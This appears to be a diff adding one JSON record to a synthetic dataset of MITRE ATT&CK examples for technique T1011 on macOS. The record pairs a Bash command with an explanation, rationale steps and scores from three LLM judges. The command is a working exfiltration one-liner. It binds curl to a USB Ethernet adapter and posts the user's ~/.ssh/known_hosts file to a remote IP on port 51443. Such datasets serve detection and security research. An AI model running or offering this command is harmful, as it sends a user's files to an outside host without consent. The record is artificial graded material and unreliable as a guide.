@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "curl --interface \"$(networksetup -getinfo 'USB 10/100/1000 LAN' | awk -F': ' '/IP address/{print $2}')\" --retry 0 --data-binary @/Users/$USER/.ssh/known_hosts https://203.0.113.60:51443/i",
+  "explanation": "Performs HTTPS exfiltration by binding curl to a USB Ethernet adapter interface, leveraging a non-primary medium (T1011).",
+  "rationale_steps": [
+    "Retrieve USB Ethernet IP via networksetup",
+    "Bind HTTP client to that alternate medium",
+    "Transmit data to an uncommon TLS port"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-641961f7-f7f3a725",
+  "source_prompt_hash": "641961f7",
+  "timestamp_utc": "2025-09-30T08:21:35.084142Z",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is well-formed with balanced quoting and valid options for curl, networksetup, and awk.",
+        "semantic_score": 4,
+        "semantic_justification": "It posts the user's known_hosts file over HTTPS while binding to the USB Ethernet adapter's IP to force egress over that non-primary medium, although it relies on that adapter being present and uses a documentation-only IP that may not be reachable.",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T01:20:58.708799Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper command substitution, valid curl flags, and correct use of awk for parsing the network interface information.",
+        "semantic_score": 5,
+        "semantic_justification": "The command correctly implements T1011 by exfiltrating SSH known_hosts data over a USB Ethernet adapter (alternative network medium) using HTTPS to a remote server, which aligns perfectly with the technique of exfiltration over a different network medium.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T01:21:03.760310Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, correct command substitution, valid flags for `curl` and `awk`, and proper command piping for Bash execution on macOS.",
+        "semantic_score": 5,
+        "semantic_justification": "The command precisely achieves the claimed intent by using `networksetup` to identify a USB Ethernet interface's IP, binding `curl` to that specific interface to exfiltrate sensitive data via HTTPS, directly implementing T1011 under the stated platform and privilege conditions.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T06:29:35.508733Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null,
+    "Syntax_Run_Details": ""
+  }
+}
